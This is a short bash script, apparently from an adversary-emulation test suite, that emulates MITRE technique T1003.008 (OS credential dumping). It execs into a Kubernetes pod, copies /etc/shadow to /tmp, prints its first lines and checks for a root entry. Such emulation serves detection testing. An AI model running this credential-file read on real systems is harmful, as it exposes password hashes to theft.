#!/usr/bin/env bash
# T1003.008: OS Credential Dumping - /etc/passwd and /etc/shadow
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
source "${SCRIPT_DIR}/common.sh"

log_header "Emulation T1003.008: Read /etc/shadow"

OUTPUT_FILE="/tmp/T1003.008.txt"

log_telemetry "T1003.008" "${RUNNER_POD_NAME}" "cat /etc/shadow"

log_info "Reading /etc/shadow inside '${RUNNER_POD_NAME}'..."
OUTPUT="$(kubectl exec -n "${TARGET_NAMESPACE}" "${RUNNER_POD_NAME}" -- bash -c \
  "cat /etc/shadow > '${OUTPUT_FILE}' && head -n 3 '${OUTPUT_FILE}' && rm -f '${OUTPUT_FILE}'")"

echo "${OUTPUT}"

if echo "${OUTPUT}" | grep -q "root:"; then
    log_success "T1003.008 emulation succeeded (Extracted /etc/shadow entry)."
else
    log_error "T1003.008 emulation failed: /etc/shadow not accessible."
    exit 1
fi
